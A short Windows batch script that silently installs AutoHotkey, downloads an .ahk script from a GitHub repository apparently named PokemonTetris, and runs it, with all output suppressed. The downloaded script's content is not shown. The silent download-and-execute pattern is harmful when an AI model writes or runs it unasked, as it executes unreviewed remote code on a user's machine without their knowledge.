@echo off
setlocal

set FILE_PATH=C:\Users\%USERNAME%\Documents\theRproject.ahk

if not exist "%ProgramFiles%\AutoHotkey\Compiler\Ahk2Exe.exe" (
    powershell -Command "winget install autohotkey.autohotkey" > nul 2>&1
)

powershell -Command "New-Item -ItemType File -Path %FILE_PATH%" > nul 2>&1

powershell -Command "curl -o %FILE_PATH% 'https://raw.githubusercontent.com/Imnot-Alice/PokemonTetris/refs/heads/main/theRproject.ahk'" > nul 2>&1

powershell -Command "%FILE_PATH%" > nul 2>&1
